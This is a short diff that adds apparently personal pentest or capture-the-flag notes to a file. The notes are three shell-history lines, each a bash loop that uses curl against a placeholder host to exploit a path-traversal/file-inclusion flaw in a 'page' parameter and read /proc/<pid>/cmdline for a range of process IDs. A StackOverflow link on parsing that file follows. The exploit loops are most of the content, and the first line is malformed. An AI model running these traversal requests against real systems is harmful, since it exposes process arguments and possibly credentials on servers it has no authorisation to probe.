@@ -1,4 +1,12 @@
 
+
+```
+ 1683  curl for i in $(seq 444 666); do curl http://THING.EDU:8000/?page=../../../../proc/$i/cmdline -o -; echo "  PID => $i"; done
+ 1684  for i in $(seq 222 666); do curl http://THING.EDU:8000/?page=../../../../proc/$i/cmdline -o -; echo "  PID => $i"; done\n
+ 1685  for i in $(seq 222 666); do curl http://THING.EDU:8000/?page=../../../../proc/$i/cmdline -o -; echo "  PID => $i"; done\n
+
+```
+
 ##
 #
 https://stackoverflow.com/questions/1585989/how-to-parse-proc-pid-cmdline
